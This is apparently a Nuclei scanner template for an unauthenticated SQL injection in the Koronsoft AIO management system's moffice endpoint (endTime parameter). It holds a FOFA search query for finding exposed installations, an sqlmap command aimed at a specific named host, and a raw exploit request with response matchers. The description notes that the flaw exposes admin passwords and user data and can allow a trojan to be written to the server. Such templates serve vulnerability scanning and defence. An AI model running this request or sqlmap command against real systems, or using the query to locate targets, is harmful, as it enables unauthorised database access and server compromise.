id: koronsoft-aio-moffice-endTime-sqli
info:
  name: 科荣 AIO 管理系统 moffice endTime params - sqli
  author: leadlife
  severity: high
  description: 科荣 AIO endTime 接口存在SQL注入漏洞，未经身份验证的远程攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限
  reference: 
    - https://github.com/wy876/POC/blob/c19942e30121f116548ca14c0375ba6c8560afeb/%E7%A7%91%E8%8D%A3AIO%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9FendTime%E5%8F%82%E6%95%B0%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md
  metadata:
    verified: true
    fofa-query: icon_hash="-638292089" || body="changeAccount('8000')"
    sqlmap: sqlmap -u "http://gantch.com:8000/moffice?op=showWorkPlanList&type=1&beginTime=1&endTime=1*&sid=1"  --batch --random-agent
  tags: koronsoft,sqli,aio

http:
  - raw:
      - |
        GET /moffice?op=showWorkPlanList&type=1&beginTime=1&endTime=1*&sid=1 HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
        Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
        Accept-Encoding: gzip, deflate
        Connection: close

    matchers:
      - type: dsl
        dsl:
          - status_code == 200
          - contains_all(body,'desc','无查询结果')
        condition: and